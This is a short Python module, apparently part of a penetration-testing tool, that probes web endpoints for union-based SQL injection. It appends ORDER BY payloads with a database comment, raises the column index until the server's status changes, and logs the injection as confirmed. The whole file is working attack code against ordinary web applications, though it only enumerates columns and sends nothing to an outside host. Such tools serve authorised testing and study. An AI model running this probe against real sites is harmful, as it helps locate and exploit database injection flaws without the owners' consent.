import requests

from utils.auxiliary import *


def try_order_by_sqli(url, options: list):
    log = Auxiliary(__name__)
    log.set_config()
    vuln_endpoints = options[0]
    db_comment = options[1]
    index = 1
    for endp in vuln_endpoints:
        while True:
            pld = "' ORDER BY " + str(index) + db_comment
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 200:
                index += 1
            else:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                break


def try_union_sqli(url, options: list):
    try_order_by_sqli(url, options)
